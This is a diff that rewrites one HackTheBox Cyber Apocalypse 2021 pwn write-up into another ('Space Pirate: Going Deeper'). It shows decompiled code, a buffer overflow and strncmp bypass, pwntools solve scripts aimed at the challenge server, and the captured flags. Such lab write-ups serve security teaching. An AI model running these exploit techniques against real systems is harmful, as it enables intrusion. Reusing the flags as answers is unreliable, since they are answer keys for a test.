@@ -1,23 +1,24 @@
-# CTF HackTheBox 2021 Cyber Apocalypse 2021 - Space Pirate: Entrypoint
+# CTF HackTheBox 2021 Cyber Apocalypse 2021 - Space Pirate: Going Deeper
 
-Category: Pwn, Points: 300
+Category: Pwn, Points: 375
 
 ![info.JPG](images/info.JPG)
 
 
-Attached file [pwn_sp_entrypoint.zip](./pwn_sp_entrypoint.zip)
+Attached file [pwn_sp_going_deeper.zip](./pwn_sp_going_deeper.zip)
 
 # Space Pirate: Entrypoint Solution
 
 Let's check the binary using ```checksec```:
 ```
-┌─[evyatar@parrot]─[/ctf_htb/cyber_apocalypse/pwn/Space_Pirate_Entrypoint]
-└──╼ $ checksec sp_entrypoint
+┌─[evyatar@parrot]─[/ctf_htb/cyber_apocalypse/pwn/Space_Pirate_Going_Deeper]
+└──╼ $ checksec sp_going_deeper
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
+    RUNPATH:  './glibc/'
 
 ```
 
@@ -25,8 +26,52 @@ Let's check the binary using ```checksec```:
 
 By running the binary we get:
 ```console
-┌─[evyatar@parrot]─[/ctf_htb/cyber_apocalypse/pwn/Space_Pirate_Entrypoint]
-└──╼ $ ./sp_entrypoint 
+┌─[evyatar@parrot]─[/ctf_htb/cyber_apocalypse/pwn/Space_Going_Deeper]
+└──╼ $ ./sp_going_deeper 
+
+
+                  Trying to leak information from the pc.. 🖥️
+
+
+             ____________________________________________________
+            /                                                    \
+           |    _____________________________________________     |
+           |   |                                             |    |
+           |   | goldenfang@d12:$ history                    |    |
+           |   |     1 ls                                    |    |
+           |   |     2 mv secret_pass.txt flag.txt           |    |
+           |   |     3 chmod -x missile_launcher.py          |    |
+           |   |     4 ls                                    |    |
+           |   |     5 history                               |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |                                             |    |
+           |   |_____________________________________________|    |
+           |                                                      |
+            \_____________________________________________________/
+                   \_______________________________________/
+                _______________________________________________
+             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
+          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
+       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
+    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
+ _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
+:-----------------------------------------------------------------------------:
+`---._.-----------------------------------------------------------------._.---'
+
+
+[*] Safety mechanisms are enabled!
+[*] Values are set to: a = [1], b = [2], c = [3].
+[*] If you want to continue, disable the mechanism or login as admin.
+
+1. Disable mechanisms ⚙️
+2. Login ✅
+3. Exit 🏃
+>> 
+
 
 
 			 Authentication System
@@ -72,130 +117,111 @@ By decompiling the binary using [Ghidra](https://github.com/NationalSecurityAgen
 ```c
 undefined8 main(void)
 {
-  long lVar1;
-  long in_FS_OFFSET;
-  long local_48;
-  long *local_40;
-  char local_38 [40];
-  long local_10;
-  
-  local_10 = *(long *)(in_FS_OFFSET + 0x28);
   setup();
   banner();
-  local_48 = 0xdeadbeef;
-  local_40 = &local_48;
-  printf(&DAT_001025e0);
-  lVar1 = read_num();
-  if (lVar1 != 1) {
-    if (lVar1 == 2) {
-      check_pass();
-    }
-    printf(&DAT_00102668,&DAT_0010259a);
-                    /* WARNING: Subroutine does not return */
-    exit(0x1b39);
-  }
-  printf("\n[!] Scanning card.. Something is wrong!\n\nInsert card\'s serial number: ");
-  read(0,local_38,0x1f);
-  printf("\nYour card is: ");
-  printf(local_38);
-  if (local_48 == 0xdead1337) {
-    open_door();
-  }
-  else {
-    printf(&DAT_001026a0,&DAT_0010259a);
-  }
-  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
-    return 0;
-  }
-                    /* WARNING: Subroutine does not return */
-  __stack_chk_fail();
+  puts("\x1b[1;34m");
+  admin_panel(1,2,3);
+  return 0;
 }
 ```
 
-Let's focous on option 2, As we can see it's called to ```check_pass()``` function where ```check_pass()``` code is:
+Let's observe on ```admin_panel()``` function:
 ```c
-void check_pass(void)
+void admin_panel(long param_1,long param_2,long param_3)
 {
   int iVar1;
-  long in_FS_OFFSET;
-  undefined8 local_28;
-  undefined8 local_20;
+  char local_38 [40];
   long local_10;
   
-  local_10 = *(long *)(in_FS_OFFSET + 0x28);
-  local_28 = 0;
-  local_20 = 0;
-  printf("[*] Insert password: ");
-  read(0,&local_28,0xf);
-  iVar1 = strncmp("0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455",(char *)&local_28,0xf);
-  if (iVar1 == 0) {
-    printf(&DAT_001025a8,&DAT_0010259a);
-                    /* WARNING: Subroutine does not return */
-    exit(0x1b39);
+  local_10 = 0;
+  printf("[*] Safety mechanisms are enabled!\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld].\n[*] If you want to continue, disable the mechanism or login as admin.\n"
+         ,param_1,param_2,param_3);
+  while (((local_10 != 1 && (local_10 != 2)) && (local_10 != 3))) {
+    printf(&DAT_004014e8);
+    local_10 = read_num();
   }
-  open_door();
-  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
-                    /* WARNING: Subroutine does not return */
-    __stack_chk_fail();
+  if (local_10 == 1) {
+    printf("\n[*] Input: ");
   }
+  else {
+    if (local_10 != 2) {
+      puts("\n[!] Exiting..\n");
+                    /* WARNING: Subroutine does not return */
+      exit(0x1b39);
+    }
+    printf("\n[*] Username: ");
+  }
+  read(0,local_38,0x39);
+  if (((param_1 != 0xdeadbeef) || (param_2 != 0x1337c0de)) || (param_3 != 0x1337beef)) {
+    iVar1 = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",local_38,0x34);
+    if (iVar1 != 0) {
+      printf("\n%s[-] Authentication failed!\n",&DAT_00400c40);
+      goto LAB_00400b38;
+    }
+  }
+  printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);
+  system("cat flag*");
+LAB_00400b38:
+  puts("\n[!] For security reasons, you are logged out..\n");
   return;
 }
 ```
 
-As we can see, If ```local_28``` is ```0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455``` then ```open_door()``` function is called.
 
-The problem is the ```read()``` function reads ```0xf``` charcacters and ```strncmp``` compare also ```0xf``` charcacters.
+```read``` function reads ```0x39``` bytes where ```local_38``` buffer size is ```0x28```.
 
-We can bypass it by convert ```0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455``` string to hex using [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Hex('Space',0)&input=MG5seVRoMzByMWcxbjRsQ3Izd00zbWIzcjVDNG5QNDU1):
-```c
-306e6c7954683330723167316e346c437233774d336d6233723543346e50343535
-```
+```strncmp``` comapres ```local_38``` with ```DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft``` where the length of this string is ```0x34```.
 
-Now we can send the hex string as the input to solve it.
+```strncmp``` will compare strings until the NULL string terminator ```\x00```.
 
-Let's use the following ```python``` [./solve.py](./solve.py):
+We have to include ```\x00``` in our input to make ```strncmp``` ignore from ```\n``` character.
+
+Let's solve it using the following ```python``` [./solve.py](./solve.py):
 ```python
 from pwn import *
 
-elf = ELF('./sp_entrypoint')
+elf = ELF('./sp_going_deeper')
 libc = elf.libc
 
 if args.REMOTE:
-    p = remote('46.101.27.51', 30797)
+    p = remote('46.101.27.51', 30335)
 else:
     p = process(elf.path)
 
 p.recvuntil('>')
-p.sendline("2")
+p.sendline("1")
 print(p.recvuntil(':'))
-p.sendline("306e6c7954683330723167316e346c437233774d336d6233723543346e50343535")
+p.sendline(b"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00")
 p.interactive()
 ```
 
 Run it:
 ```console
-┌─[evyatar@parrot]─[/ctf_htb/cyber_apocalypse/pwn/Space_Pirate_Entrypoint]
+┌─[evyatar@parrot]─[/ctf_htb/cyber_apocalypse/pwn/Space_Going_Deeper]
 └──╼ $ python3 solve.py REMOTE
-[*] '/ctf_htb/cyber_apocalypse/pwn/Space_Pirate_Entrypoint/sp_entrypoint'
+[*] '/ctf_htb/cyber_apocalypse/pwn/Space_Going_Deeper/sp_going_deeper'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
-    Stack:    Canary found
+    Stack:    No canary found
     NX:       NX enabled
-    PIE:      PIE enabled
+    PIE:      No PIE (0x400000)
     RUNPATH:  b'./glibc/'
-[*] '/ctf_htb/cyber_apocalypse/pwn/Space_Pirate_Entrypoint/glibc/libc.so.6'
+[*] '/ctf_htb/cyber_apocalypse/pwn/Space_Going_Deeper/glibc/libc.so.6'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-[+] Opening connection to 46.101.27.51 on port 30797: Done
-b' [*] Insert password:'
+[+] Opening connection to 46.101.27.51 on port 30335: Done
+b'> \n[*] Input:'
 [*] Switching to interactive mode
  
-[+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!}
-[-] Invalid option! Intruder detected! 🚨 🚨
+[+] Welcome admin! The secret message is: HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}
+
+[!] For security reasons, you are logged out..
+
 [*] Got EOF while reading in interactive
+$  
 ```
 
-And we get the flag ```HTB{th3_g4t35_4r3_0p3n!}```.
+And we get the flag ```HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}```.
